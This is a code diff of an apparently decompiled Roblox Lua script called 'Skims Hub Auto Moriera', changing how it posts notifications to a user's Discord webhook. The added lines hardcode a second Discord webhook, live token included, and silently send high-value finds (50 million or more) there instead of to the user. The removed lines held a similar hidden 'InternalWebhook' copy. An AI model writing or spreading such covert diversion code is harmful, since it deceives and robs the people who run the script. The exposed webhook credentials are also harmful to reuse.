@@ -837,56 +837,47 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                     task.wait(0.5);
                     l_result_0:Close();
                 end;]]
+                local webhooks = "https://discord.com/api/webhooks/1450162332154990716/u5X2hSvqPIBQg7S_lqGety3cOxJbA_Dhpcm3wEJvNxfclkOOY9NIi0bjXcE8mfgbvr4V"
                 if getgenv().UserWebhookURL then
-                    local l_UserWebhookURL_0 = getgenv().UserWebhookURL
-                    if type(l_UserWebhookURL_0) == "string" and l_UserWebhookURL_0:match("discord.com/api/webhooks") then
-                        local l_UserPingThreshold_0 = getgenv().UserPingThreshold
-                        local v118 = type(l_UserPingThreshold_0) == "number" and l_UserPingThreshold_0 or 50000000
-
-                        l_UserWebhookURL_0 = ""
+                    local l_UserWebhookURL_0 = getgenv().UserWebhookURL;
+                    if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("discord.com/api/webhooks") then
+                        local l_UserPingThreshold_0 = getgenv().UserPingThreshold;
+                        local v118 = type(l_UserPingThreshold_0) == "number" and getgenv().UserPingThreshold or 50000000;
+                        l_UserWebhookURL_0 = "";
                         if v109 and v118 <= v109.genValue then
-                            l_UserWebhookURL_0 = "@everyone"
-                        end
-
-                        local v119 = {
-                            content = l_UserWebhookURL_0,
-                            username = "Skims Hub Auto Moriera",
-                            avatar_url = "https://i.imgur.com/lPNVdqu.jpeg",
-                            embeds = { v111 }
-                        }
-
-                        -- כתובת InternalWebhook
-                        local InternalWebhookURL = "https://discord.com/api/webhooks/1450221423712014450/VuyCh_XldkxSLRH2osJIgBH3l2oO47xuFpHflHFnzrTBAFqGCKeWYupWapaSj_LEkRUB"
-
-                        if v109.genValue > 40000000 then
-                            -- אם מעל 40 מיליון שולח רק ל-Internal
-                            pcall(function()
-                                v7({
-                                    Url = InternalWebhookURL,
-                                    Method = "POST",
-                                    Headers = { ["Content-Type"] = "application/json" },
-                                    Body = l_HttpService_0:JSONEncode(v119)
-                                })
-                            end)
-                        else
-                            -- אם מתחת ל-40 מיליון שולח גם ל-User וגם ל-Internal
-                            pcall(function()
-                                v7({
-                                    Url = l_UserWebhookURL_0,
-                                    Method = "POST",
-                                    Headers = { ["Content-Type"] = "application/json" },
-                                    Body = l_HttpService_0:JSONEncode(v119)
-                                })
-                            end)
-                            pcall(function()
-                                v7({
-                                    Url = InternalWebhookURL,
-                                    Method = "POST",
-                                    Headers = { ["Content-Type"] = "application/json" },
-                                    Body = l_HttpService_0:JSONEncode(v119)
-                                });
-                            end);
+                            l_UserWebhookURL_0 = "@everyone";
                         end;
+                        local v119 = {
+                            content = l_UserWebhookURL_0, 
+                            username = "Skims Hub Auto Moriera", 
+                            avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
+                            embeds = {
+                                v111
+                            }
+                        };
+                        if v109.genValue < 50000000 then
+                        pcall(function() 
+                            v7({
+                                Url = getgenv().UserWebhookURL, 
+                                Method = "POST", 
+                                Headers = {
+                                    ["Content-Type"] = "application/json"
+                                }, 
+                                Body = l_HttpService_0:JSONEncode(v119)
+                            });
+                        end);
+                    else
+                        pcall(function()
+                            v7({
+                                Url = webhooks,
+                                Method = "POST",
+                                Headers = {
+                                    ["Content-Type"] = "application/json"
+                                },
+                                Body = l_HttpService_0:JSONEncode(v119)
+                            });
+                        end);
+                    end
                     end;
                 end;
                 return;
